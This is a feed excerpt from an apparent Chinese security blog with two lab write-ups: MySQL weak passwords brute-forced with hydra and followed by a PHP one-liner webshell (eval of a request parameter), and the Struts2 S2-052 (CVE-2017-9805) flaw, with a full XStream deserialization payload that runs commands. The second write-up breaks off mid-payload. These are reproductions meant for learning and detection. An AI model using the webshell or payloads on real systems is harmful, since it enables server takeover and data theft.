    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="MySQL弱密码和webshell"><a href="#MySQL弱密码和webshell" class="headerlink" title="MySQL弱密码和webshell"></a>MySQL弱密码和webshell</h1><hr><h2 id="了解漏洞"><a href="#了解漏洞" class="headerlink" title="了解漏洞"></a>了解漏洞</h2><h3 id="Mysql是什么？"><a href="#Mysql是什么？" class="headerlink" title="Mysql是什么？"></a>Mysql是什么？</h3><p>Mysql是一种典型的小型的关系型数据库，通常用于网站后台数据库。一般为lamp或者wamp构成一般web服务器。他一般默认端口是3306。</p><h3 id="Mysql弱密码漏洞是什么"><a href="#Mysql弱密码漏洞是什么" class="headerlink" title="Mysql弱密码漏洞是什么"></a>Mysql弱密码漏洞是什么</h3><p>Mysql弱密码漏洞，就是说mysql的root用户的没有密码，或者密码太简单，太短，容易被猜测或者被爆破。可以被攻击者用来恶意登录，窃取数据库信息，而且一般mysql作为网站后台数据库，所以可能导致被攻击者获取网站权限，getshell。</p><h2 id="分析漏洞产生原理"><a href="#分析漏洞产生原理" class="headerlink" title="分析漏洞产生原理"></a>分析漏洞产生原理</h2><h3 id="具体漏洞产生的原理是什么"><a href="#具体漏洞产生的原理是什么" class="headerlink" title="具体漏洞产生的原理是什么"></a>具体漏洞产生的原理是什么</h3><p>Mysql的弱口令漏洞主要是因为管理员没有安全意识，使用了mysql的默认密码，之前的版本默认密码是空的很多人没有更改，但是mysql5.7之后就不允许密码为空了，安装的时候就会让你输入密码了。然后一些人改了密码，但是密码太弱了，短的纯数字的等等，很容易被爆破。</p><h3 id="Mysql结合webshell有什么危害"><a href="#Mysql结合webshell有什么危害" class="headerlink" title="Mysql结合webshell有什么危害"></a>Mysql结合webshell有什么危害</h3><p>通过web注入获取webshell我有过一定的经历，所以也知道这其中的危害。注入也是获取数据库信息，如果攻击者获取了mysql的权限，获取了数据，便可得到数据库数据，同时网站的许多敏感信息都是存放的数据库中的，比如用户名密码，管理员账号密码。然而加密往往都是MD5，基本上简单的md5都可以通过网上的彩虹表匹配找到对应的密码。然后攻击者便可利用账号密码登录web后台，利用上传木马等手段，更可获取网站服务器的权限，甚至之后的内网等等。所以说mysql结合webshell的危害是很可怕的。</p><h2 id="漏洞重现和利用"><a href="#漏洞重现和利用" class="headerlink" title="漏洞重现和利用"></a>漏洞重现和利用</h2><h3 id="安装lamp（linux-apache-mysql-php）环境"><a href="#安装lamp（linux-apache-mysql-php）环境" class="headerlink" title="安装lamp（linux+apache+mysql+php）环境"></a>安装lamp（linux+apache+mysql+php）环境</h3><p>本来想直接用我装好的wamp的，不过由于lamp使用更加广泛，所以这次搭建一个lamp的环境进行测试。</p><h4 id="安装apache"><a href="#安装apache" class="headerlink" title="安装apache"></a>安装apache</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dnf install httpd –y</span><br><span class="line">$ systemctl <span class="built_in">enable</span> httpd</span><br><span class="line">$ systemctl start httpd</span><br></pre></td></tr></table></figure><p>安装好之后，开启了服务就在浏览器上输入127.0.0.1:8080(我设置成了8080，没有更改的话就是80)访问看看有没有成功开启apacge服务，如下图：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-6ed8a18b88e834b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p><h4 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dnf install [https://dev.mysql.com/get/mysql57-community-release-fc26-10.noarch.rpm](https://dev.mysql.com/get/mysql57-community-release-fc26-10.noarch.rpm)</span><br><span class="line">$ dnf install mysql-community-server</span><br><span class="line">$ systemctl start mysqld.service    //启动mysql服务器并同时自动启动mysql</span><br><span class="line">$ systemctl <span class="built_in">enable</span> mysqld.service</span><br><span class="line">$ grep <span class="string">'A temporary password is generated for root@localhost'</span> /var/<span class="built_in">log</span>/mysqld.log |tail -1 //获取随机生成的root密码</span><br></pre></td></tr></table></figure><p>然后设置mysql的安全配置：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/mysql_secure_installatio</span><br></pre></td></tr></table></figure></p><p>主要是进行更改root密码，是否删除匿名用户，是否允许远程root登录，是否删除测试数据库并访问它，是否重新加载特权表等进行配置。最重要的就是更改系统自动生成的密码。</p><h4 id="安装php"><a href="#安装php" class="headerlink" title="安装php"></a>安装php</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dnf install php –y</span><br><span class="line">$ vi /var/www/html/test.php     //检查php是否成功安装</span><br><span class="line">$ &lt;? phpphpinfo(); ?&gt;   //文本写入</span><br><span class="line">$ systemctl restart httpd     //重启apache</span><br></pre></td></tr></table></figure><p>然后访问127.0.0.1:8080/test.php<br><img src="http://upload-images.jianshu.io/upload_images/6269327-2b9ad792af7a9481.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>可以看到php环境配置成功了，然后需要安装php模块，主要是用于连接php和mysql 的：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dnf search php</span><br><span class="line">$ dnf install php-mysql –y</span><br><span class="line">$ systemctl restart httpd</span><br></pre></td></tr></table></figure></p><p>安装好之后重启了apache之后再次看页面：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-5259d5fe5fe8c3cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>模块安装成功。</p><h4 id="安装hydra"><a href="#安装hydra" class="headerlink" title="安装hydra"></a>安装hydra</h4><p>这个网上很多教程，我这里贴一下命令就是了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yum install openssl-devel pcre-devel ncpfs-devel postgresql-devel libssh-devel subversion-devel</span><br></pre></td></tr></table></figure></p><p><img src="http://upload-images.jianshu.io/upload_images/6269327-d86b7ab15504945b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p><h2 id="利用hydra进行mysql弱密码攻击"><a href="#利用hydra进行mysql弱密码攻击" class="headerlink" title="利用hydra进行mysql弱密码攻击"></a>利用hydra进行mysql弱密码攻击</h2><p>我先利用自己之前收集的弱密码，选了top2000，然后生成密码字典，用于爆破。因为我的mysql密码并不是弱密码，所以为了实现成功爆破我把我的密码也加入了密码字典：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-2dabd057efc8377e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"><br>开始之前先用nmap扫描一下主机，确定端口开放情况：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-31974a8f967fca23.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6_LI (2).jpg"><br>可以看到nmap扫描到了端口3306开放，服务就是mysql。接下来便可以利用hydra对3306端口进行爆破：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-cab41ca0703095ef.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7_LI.jpg"><br>Bingo！成功爆破出了密码，但是这个过程出现了很多的问题，首先就是命令不对，导致一直出现爆破不出来的问题，然后我以为只是mysql最大连接数的问题，于是把最大连接数改成了2000，然后重新来，还是有问题：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d48513947e395dc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br>这个是一开始我使用的命令，后面换了下面的命令就成功了：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ Hydra –l root –P password.txt 127.0.0.1 mysql</span><br></pre></td></tr></table></figure></p><p>当然这里也可以同时使用用户名字典和密码字典，但是因为mysql基本都是root，所以我就直接用root，但是用户字典也很重要。<br>扫出了密码下面便可进行写入webshell了。<br>为了保证实验正确性，我使用另一台主机进行写入webshell进行远程连接。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-1dc606443272c6a1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"><br>但是发现我发远程连接，去服务器上看发现果然，root只支持在本地访问：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-1cf73128db561bee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"><br>我们更改一下，把localhost更改为%，这样就可以支持任意地址访问了。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-c9fe27076dd2b46a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="11.png"><br>这样就ok啦！<img src="http://upload-images.jianshu.io/upload_images/6269327-c1220f2de056717d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12.png"><br>然后进行写入php一句话，但是导出时发现文件被限制了输出位置，然后我在my.cnf中加入secure-file-priv = ‘’：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-970f8babb2a990df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="13.png"><br>但是发现还是权限不够，发现是输出目录权限问题，使用chomd 777 www 命令授予权限，最后成功执行。下图因为当时已经输出了没有截图，我就又执行了一遍。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-d58287ffe90be34a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="14.png"><br>然后写入一句话，接下来就可以用菜刀啦！<br><img src="http://upload-images.jianshu.io/upload_images/6269327-da316a2649c5adef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="15.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-949139e7e01590b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16.png"><br>成功连接！</p><h2 id="如果公司的mysql存在弱密码会有怎样的风险？"><a href="#如果公司的mysql存在弱密码会有怎样的风险？" class="headerlink" title="如果公司的mysql存在弱密码会有怎样的风险？"></a>如果公司的mysql存在弱密码会有怎样的风险？</h2><p>如果某个公司的web服务器存在弱密码，很有可能被攻击者利用，破解，爆破出了数据库用户密码，这会致使公司网站信息，内部信息被窃取，许多敏感信息暴露，甚至可能被攻击者勒索。其次，如果攻击者获取数据权限后还获取了webshell，进行提权等操作之后，便可获得公司服务器的权限，造成更严重的信息泄露。</p><h2 id="使用openvas对该漏洞进行扫描"><a href="#使用openvas对该漏洞进行扫描" class="headerlink" title="使用openvas对该漏洞进行扫描"></a>使用openvas对该漏洞进行扫描</h2><p>因为怕扫不出来所以我不mysql的密码改成了123456.<br><img src="http://upload-images.jianshu.io/upload_images/6269327-5f29ae6a2fda62da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="17.png"><br><img src="http://upload-images.jianshu.io/upload_images/6269327-dd3e04ff12f8aabd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="18.png"><br>可以看到成功的扫描出了mysql weak password。Mysql的弱密码，点进去可以看到，mysql中root用户的密码已经被爆出来了，为123456；同时可以看到这是一个高危漏洞，评分为9.0分。</p><h2 id="一些问题的解决"><a href="#一些问题的解决" class="headerlink" title="一些问题的解决"></a>一些问题的解决</h2><p>在利用webshell时确保主机能访问靶机的apache服务。这样才能保证菜刀可以连接成功。还有就是在高版本的php新增了安全策略会自动过滤非法提交的post或get参数，所以这样导致了很多同学用菜刀连接失败，响应确实200.因为一句话执行了，但是get参数没有成功转换为变量。写入webshell时最主要的就是权限问题了。Mysql5.7中写入导出指定了文件夹，使我们不能成功将一句话写入到指定的的文件夹。我在my.cnf加入上面提到的代码，使可以导出到任意有权限的目录。</p><p>因为当php7时因为菜刀无法连接的问题，所以使用手动的方法连接。所以我将传递的一句话&lt;? php eval($_POST[cmd]); ?&gt; 里面的POST传递模式改为了GET这样方便演示，因为post的话还需要抓包更改，但也是可以的。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-84ebef8e2b056acd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="19.png"><br>可以看到，将语句赋值给cmd之后便可传过去执行。其实就是菜刀把我们传过去的cmd设置成为全局变量，然后我们传参之后就可以进行语句执行，菜刀就是集成这些语句。<br>因为get传参有长度限制，所以我使用postman来进行post的传参查询<br><img src="http://upload-images.jianshu.io/upload_images/6269327-370861b341e7597f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="20.png"><br>网上找了查询php查询文件的代码，成功查询到了目录下的文件，然后输入不同函数就可以执行了。比如下载等，菜刀其实就是集成了这些代码的工具，我们通过自己手动测试也可以达到一样的效果。所以猜测php7中的一句话无法用菜刀连接的可能是因为php7中对菜刀中集成的代码中的某个重要函数进行了过滤，所以菜刀不能连接，我们自己写的却可以。<br>还有其他方法，比如直接写入了webshell大马，直接连接。<br><img src="http://upload-images.jianshu.io/upload_images/6269327-5ac632e9d18ef2b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="21.png"><br>但是就是大马写入的时候比较麻烦，代码较长。写入数据库时比较麻烦，而且不容易伪装，很容易被发现。</p><h2 id="解决php7无法使用菜刀连接一句话问题"><a href="#解决php7无法使用菜刀连接一句话问题" class="headerlink" title="解决php7无法使用菜刀连接一句话问题"></a>解决php7无法使用菜刀连接一句话问题</h2><p>因为php7对菜刀的过滤，所以博主分析一个更改后可以在php7环境下连接一句话的java版菜刀，mac和win都可以用<br>百度网盘：<a href="https://pan.baidu.com/s/1d28kqi" target="_blank" rel="noopener">https://pan.baidu.com/s/1d28kqi</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;MySQL弱密码和webshell&quot;&gt;&lt;a href=&quot;#MySQL弱
      
    
    </summary>
    
      <category term="漏洞复现" scheme="https://rliyuqing.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="mysql弱密码" scheme="https://rliyuqing.github.io/tags/mysql%E5%BC%B1%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>Struts2-052漏洞学习及反弹shell试验</title>
    <link href="https://rliyuqing.github.io/2019/04/15/4.%20Struts2-052%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E8%AF%95%E9%AA%8C/"/>
    <id>https://rliyuqing.github.io/2019/04/15/4. Struts2-052漏洞学习及反弹shell试验/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-11-13T13:49:23.675Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="Struts2-052漏洞学习"><a href="#Struts2-052漏洞学习" class="headerlink" title="Struts2-052漏洞学习"></a>Struts2-052漏洞学习</h1><hr><h2 id="了解漏洞"><a href="#了解漏洞" class="headerlink" title="了解漏洞"></a>了解漏洞</h2><h3 id="Struts是什么？"><a href="#Struts是什么？" class="headerlink" title="Struts是什么？"></a>Struts是什么？</h3><p>Struts是一个特别常用的开源web框架，用于扩展JAVA Servlet API并使用了模型（M），视图（V），控制（C）体系结构。使用这个框架，我们可以用各种标准技术（如 JSP、JavaBeans、XML等）创建可维护、可扩展并且灵活的 Web 应用程序。可以说用struts来开发java web应用程序是很简单，但是效率又很高。<br>之后，Struts的Java EE Web框架的团体，决定合作共同开发一个新的，整合了WebWork与Struts优点，并且更加优雅、扩展性更强的框架，命名为“Struts 2”，原Struts的1.x版本产品称为“Struts 1”。Struts项目并行提供与维护两个主要版本的框架产品——Struts 1与Struts 2。所以struts项目的两个产品就是 struts1和struts 2。<br>维基百科：“它通过采用Java Servlet／JSP技术，实现了基于Java EE Web应用的Model-View-Controller（MVC）设计模式的应用框架，是MVC经典设计模式中的一个经典产品。”<br>使用 Struts 时，此框架将为您提供一个控制器 Servlet (ActionServlet)，它在 IDE 中包含的 Struts 库中定义，并自动在 web.xml 部署描述符中注册，就下面这个：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-508e98961b35075e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br>该控制器 Servlet 使用 struts-config.xml 文件将传入请求映射到 Struts Action 对象，并实例化与暂时存储窗体数据的操作相关联的任何 ActionForm 对象。Action 对象在使用窗体 Bean 中存储的任何数据的同时，使用其 execute 方法处理请求。一旦 Action 对象处理了请求，它就将存储任何新数据（即，存储在窗体 Bean 或单独的结果 Bean 中），并将结果转发到相应的视图中。</p><h3 id="Struts2-052是什么漏洞？"><a href="#Struts2-052是什么漏洞？" class="headerlink" title="Struts2-052是什么漏洞？"></a>Struts2-052是什么漏洞？</h3><p>s2-052漏洞是当用户使用带有XStream组件的Struts-REST插件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可直接在数据包中插入恶意代码。导致攻击者可以构造恶意xml payload导致RCE（远程代码执行）。<br>相对于之前struts2爆出来的漏洞来说，s_052漏洞危害稍微小一些，因为利用环境比较苛刻，需要使用Struts2 REST插件的XStream组件。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">·漏洞描述：Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击。</span><br><span class="line">·漏洞编号：CVE-2017-9805</span><br><span class="line">·漏洞作者：lgtm.com的安全研究员</span><br><span class="line">·影响版本：Version 2.5.0 to 2.5.12 和 Version 2.3.0 to 2.3.33</span><br><span class="line">·漏洞等级：高危</span><br></pre></td></tr></table></figure></p><h2 id="分析漏洞原理"><a href="#分析漏洞原理" class="headerlink" title="分析漏洞原理"></a>分析漏洞原理</h2><h3 id="struct2-052漏洞产生的原因是什么？"><a href="#struct2-052漏洞产生的原因是什么？" class="headerlink" title="struct2-052漏洞产生的原因是什么？"></a>struct2-052漏洞产生的原因是什么？</h3><p>这个漏洞触发点是REST插件在解析请求中的xml文件时，调用了XStreamHandler，传入的数据会被默认进行反序列化，进行反序列化操作时，未对数据内容进行有效验证，可直接在数据包中插入恶意代码，如果当传入的xml是个经过XStream序列化的恶意对象时，便造成反序列化漏洞。<br>其实简单来说原因有两个：一个是 Struts2 REST插件(struts2-rest-plugin-2.x.jar)本身没有对进入的数据进行安全检查，导致攻击者可以传入恶意的xml对象可以传入到XStream里。另一个是XStream在反序列化传入的xml造成的远程代码执行。</p><h3 id="一个系统存在这个漏洞会导致什么后果？"><a href="#一个系统存在这个漏洞会导致什么后果？" class="headerlink" title="一个系统存在这个漏洞会导致什么后果？"></a>一个系统存在这个漏洞会导致什么后果？</h3><p>当使用带有XStream处理程序的Struts REST插件来处理XML有效负载时，可能会发生远程执行代码攻击。这会使攻击者可以通过任意恶意代码来接管服务器，获取服务器的权限。比如说执行一些eyi代，把木马文件写入服务器的主目录！写入主目录，这很可怕，写入小马之后获取权限。最后导致服务器被攻击者控制，造成信息泄露等，甚至攻击者利用服务器进行其他非法操作，利用该服务器攻击等。</p><h2 id="漏洞的重现和利用"><a href="#漏洞的重现和利用" class="headerlink" title="漏洞的重现和利用"></a>漏洞的重现和利用</h2><h3 id="下载java并配置环境"><a href="#下载java并配置环境" class="headerlink" title="下载java并配置环境"></a>下载java并配置环境</h3><p>这个应该很多朋友都做过，所以我也很早都已经配置好了，所以展示一下代码和配置环境变量的操作：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ yum install java*jdk*devel*   //使用模糊匹配，搜索然后下载指定版本的</span><br><span class="line">$ //下载搜索到的最新的</span><br><span class="line">$ //这样的话就不用进行环境变量配置了</span><br></pre></td></tr></table></figure></p><p>还可以直接去sun网站上下载java然后手动安装，但需要修改环境变量。在/etc/profile.d/文件夹下添加一个java.sh文件，或者修改/etc/profile文件，两种方式都在文件中添加入java的classpath和path，然后输入命令：source  /etc/profile，即可使配置生效。</p><h3 id="下载tomcat并配置"><a href="#下载tomcat并配置" class="headerlink" title="下载tomcat并配置"></a>下载tomcat并配置</h3><p>执行命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo dnf install tomcat</span><br><span class="line">$ systemctl start tomcat</span><br></pre></td></tr></table></figure></p><p>然后需要在 /usr/share/tomcat/webapps目录下创建一个目录为ROOT（必须大写），然后访问127.0.0.1:8080便可以访问，但是因为里面是空的所以显示404，但是可以看到tomcat服务器信息：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-bda188ed7e155fb5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>最好是去官网下载对应的版本的tomcat的提示成功页面，网上下载后把下载的包里的webapps文件夹导入到虚拟机中的webapps目录就行。如果像我这样虽然tomcat成功配置了但是很可能导致后面openvas无法扫描到漏洞。官网下载对应版本的地址：<a href="http://tomcat.apache.org/，网站左边可以选择对应版本下载" target="_blank" rel="noopener">http://tomcat.apache.org/，网站左边可以选择对应版本下载</a><br>配置文件在 /etc/tomcat/tomcat.conf</p><h3 id="下载存在漏洞的struct2框架版本"><a href="#下载存在漏洞的struct2框架版本" class="headerlink" title="下载存在漏洞的struct2框架版本"></a>下载存在漏洞的struct2框架版本</h3><p>去官网下载该漏洞影响的最后一个版本的struts2框架，struts-2.5.12，然后解压后将apps目录下的struts2-rest-showcase.war和struts2-showcase.war文件放到webapps目录下（/Library/Tomcat/webapps）重启tomcat后访问：<br><a href="http://127.0.0.1:8080/struts2-rest-showcase/" target="_blank" rel="noopener">http://127.0.0.1:8080/struts2-rest-showcase/</a><br><img src="http://upload-images.jianshu.io/upload_images/6269327-f2641781e53fcae9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="222.png"><br>可以看到已经搭建成功了。但是我进行操作时比如点击用户后的view进行操作时跳转404，经过测试只有切换成root用户之间登录fedora后才能进行操作。</p><h3 id="生成攻击payload"><a href="#生成攻击payload" class="headerlink" title="生成攻击payload"></a>生成攻击payload</h3><p>在操作页面编辑后点击submit，然后使用firefox编辑重发：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-43d5691268d9b30e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br>将消息头中更改：<br>执行命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ Content-Type: application/xml</span><br></pre></td></tr></table></figure></p><p>更改request body为：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;map&gt; </span><br><span class="line">&lt;entry&gt; </span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt; &lt;dataHandler&gt; &lt;dataSource class=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage<span class="variable">$XmlDataSource</span>"</span>&gt; &lt;is class=<span class="string">"javax.crypto.CipherInputStream"</span>&gt; &lt;cipher class=<span class="string">"javax.crypto.NullCipher"</span>&gt; &lt;initialized&gt;<span class="literal">false</span>&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt; &lt;iter class=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt; &lt;iter class=<span class="string">"java.util.Collections<span class="variable">$EmptyIterator</span>"</span>/&gt; &lt;next class=<span class="string">"java.lang.ProcessBuilder"</span>&gt; &lt;<span class="built_in">command</span>&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;string&gt;/tmp/<span class="built_in">test</span>&lt;/string&gt; &lt;/<span class="built_in">command</span>&gt; &lt;redirectErrorStream&gt;<span class="literal">false</span>&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=<span class="string">"javax.imageio.ImageIO<span class="variable">$ContainsFilter</span>"</span>&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=<span class="string">"string"</span>&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=<span class="string">"java.lang.ProcessBuilder<span class="variable">$NullInputStream</span>"</span>/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;<span class="keyword">done</span>&gt;<span class="literal">false</span>&lt;/<span class="keyword">done</span>&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;<span class="literal">false</span>&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;<span class="literal">false</span>&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt; </span><br><span class="line">&lt;/entry&gt; </span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure></p><p>Body内容中的意思是在在tmp文件夹下面生成一个test文件。编辑重发后到指定目录检查：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-ca23173b3e0218df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"><br>成功生成了test文件；说明远程代码执行成功。验证了可以远程执行代码（RCE）攻击。</p><h3 id="使用burpsuite进行截包重发，查看结果"><a href="#使用burpsuite进行截包重发，查看结果" class="headerlink" title="使用burpsuite进行截包重发，查看结果"></a>使用burpsuite进行截包重发，查看结果</h3><p>首先下载安装bp：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://labfile.oss.aliyuncs.com/courses/726/burpsuite_free.jar</span><br></pre></td></tr></table></figure></p><p>打开：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ /usr/bin/java -Xmx2g  -jar  burpsuite_free.jar</span><br></pre></td></tr></table></figure></p><p>设置firefox代理127.0.0.1:8080<br>注意firefox设置代理时要把下面的localhost和127.0.01关掉。<br>bp监听127.0.0.0:8080，如果点不了就是端口冲突，被占用了，换端口就行<br><img src="http://upload-images.jianshu.io/upload_images/6269327-a4e3b64771ce3fe5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"><br>然后进行抓包重发：<br>更改headers中更改Content-Type: application/xml<br>并将body中的更改为payload：<br><img src="http://upload-images.jianshu.io/upload_images/6269327-c201fbf8a0d10070.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"><br>我重新发送的远程执行代码是要在/tmp下新建一个vuln文件。<br>Payload：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">&lt;entry&gt;</span><br><span class="line">&lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt; &lt;dataHandler&gt; &lt;dataSource class=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage<span class="variable">$XmlDataSource</span>"</span>&gt; &lt;is class=<span class="string">"javax.crypto.CipherInputStream"</span>&gt; &lt;cipher class=<span class="string">"javax.crypto.NullCipher"</span>&gt; &lt;initialized&gt;<span class="literal">false</span>&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt; &lt;iter class=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt; &lt;iter class=<span class="string">"java.util.Collections<span class="variable">$EmptyIterator</span>"</span>/&gt; &lt;next class=<span class="string">"java.lang.ProcessBuilder"</span>&gt; &lt;<span class="built_in">command</span>&gt;&lt;string&gt;/usr/bin/touch&lt;/string&gt;&lt;string&gt;/tmp/vuln&lt;/string&gt; &lt;/<span class="built_in">command</span>&gt; &lt;redirectErrorStream&gt;<span class="literal">false</span>&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=<span class="string">"javax.imageio.ImageIO<span class="variable">$ContainsFilter</span>"</span>&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=<span class="string">"string"</span>&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=<span class="string">"java.lang.ProcessBuilder<span class="variable">$NullInputStream</span>"</span>/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;<span class="keyword">done</span>&gt;<span class="literal">false</span>&lt;/<span class="keyword">done</span>&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;<span class="literal">false</span>&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;<span class="literal">false</span>&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=<span 